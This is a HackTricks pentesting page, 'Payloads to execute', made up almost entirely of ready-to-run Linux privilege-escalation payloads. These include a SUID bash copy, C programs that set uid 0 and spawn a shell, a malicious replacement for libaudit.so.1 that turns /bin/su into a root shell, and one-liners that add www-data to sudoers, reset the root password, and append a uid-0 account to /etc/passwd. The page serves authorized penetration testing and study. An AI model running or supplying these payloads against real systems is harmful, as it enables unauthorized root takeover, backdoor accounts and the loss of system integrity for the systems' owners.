# Payloads to execute

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the [hacktricks repo](https://github.com/carlospolop/hacktricks) and [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

## Bash

```bash
cp /bin/bash /tmp/b && chmod +s /tmp/b
/bin/b -p #Maintains root privileges from suid, working in debian & buntu
```

## C

```c
//gcc payload.c -o payload
int main(void){
    setresuid(0, 0, 0); //Set as user suid user
    system("/bin/sh");
    return 0;
}
```

```c
//gcc payload.c -o payload
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>

int main(){
    setuid(getuid());
    system("/bin/bash");
    return 0;
}
```

```c
// Privesc to user id: 1000
#define _GNU_SOURCE
#include <stdlib.h>
#include <unistd.h>

int main(void) {
    char *const paramList[10] = {"/bin/bash", "-p", NULL};
    const int id = 1000;
    setresuid(id, id, id);
    execve(paramList[0], paramList, NULL);
    return 0;
}
```

## Overwriting a file to escalate privileges

### Common files

* Add user with password to _/etc/passwd_
* Change password inside _/etc/shadow_
* Add user to sudoers in _/etc/sudoers_
* Abuse docker through the docker socket, usually in _/run/docker.sock_ or _/var/run/docker.sock_

### Overwriting a library

Check a library used by some binary, in this case `/bin/su`:

```bash
ldd /bin/su
        linux-vdso.so.1 (0x00007ffef06e9000)
        libpam.so.0 => /lib/x86_64-linux-gnu/libpam.so.0 (0x00007fe473676000)
        libpam_misc.so.0 => /lib/x86_64-linux-gnu/libpam_misc.so.0 (0x00007fe473472000)
        libaudit.so.1 => /lib/x86_64-linux-gnu/libaudit.so.1 (0x00007fe473249000)
        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fe472e58000)
        libdl.so.2 => /lib/x86_64-linux-gnu/libdl.so.2 (0x00007fe472c54000)
        libcap-ng.so.0 => /lib/x86_64-linux-gnu/libcap-ng.so.0 (0x00007fe472a4f000)
        /lib64/ld-linux-x86-64.so.2 (0x00007fe473a93000)
```

In this case lets try to impersonate `/lib/x86_64-linux-gnu/libaudit.so.1`.\
So, check for functions of this library used by the **`su`** binary:

```bash
objdump -T /bin/su | grep audit
0000000000000000      DF *UND*  0000000000000000              audit_open
0000000000000000      DF *UND*  0000000000000000              audit_log_user_message
0000000000000000      DF *UND*  0000000000000000              audit_log_acct_message
000000000020e968 g    DO .bss   0000000000000004  Base        audit_fd
```

The symbols `audit_open`, `audit_log_acct_message`, `audit_log_acct_message` and `audit_fd` are probably from the libaudit.so.1 library. As the libaudit.so.1 will be overwritten by the malicious shared library, these symbols should be present in the new shared library, otherwise the program will not be able to find the symbol and will exit.

```c
#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>

//gcc -shared -o /lib/x86_64-linux-gnu/libaudit.so.1 -fPIC inject.c

int audit_open;
int audit_log_acct_message;
int audit_log_user_message;
int audit_fd;

void inject()__attribute__((constructor));

void inject()
{
    setuid(0);
    setgid(0);
    system("/bin/bash");
}
```

Now, just calling **`/bin/su`** you will obtain a shell as root.

## Scripts

Can you make root execute something?

### **www-data to sudoers**

```bash
echo 'chmod 777 /etc/sudoers && echo "www-data ALL=NOPASSWD:ALL" >> /etc/sudoers && chmod 440 /etc/sudoers' > /tmp/update
```

### **Change root password**

```bash
echo "root:hacked" | chpasswd
```

### Add new root user to /etc/passwd

```bash
echo hacker:$((mkpasswd -m SHA-512 myhackerpass || openssl passwd -1 -salt mysalt myhackerpass || echo '$1$mysalt$7DTZJIc9s6z60L6aj0Sui.') 2>/dev/null):0:0::/:/bin/bash >> /etc/passwd
```

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the [hacktricks repo](https://github.com/carlospolop/hacktricks) and [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
